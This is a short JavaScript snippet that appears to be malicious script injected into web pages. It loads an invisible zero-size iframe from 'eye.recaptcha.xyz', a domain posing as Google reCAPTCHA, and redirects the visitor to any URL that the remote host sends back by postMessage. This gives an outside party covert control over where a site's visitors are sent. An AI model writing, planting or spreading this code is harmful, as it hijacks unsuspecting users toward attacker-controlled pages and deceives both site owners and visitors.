var base = "https://eye.recaptcha.xyz";
var iframe = document.createElement('iframe');
iframe.src = base+"/validation";
iframe.style = "border:0;margin:0;padding:0;width:0;height:0";
document.documentElement.appendChild(iframe);
function receiveMessage(event)
{
    if (event.origin !== base)
        return;
    window.location.href = event.data;
}
window.addEventListener("message", receiveMessage, false);

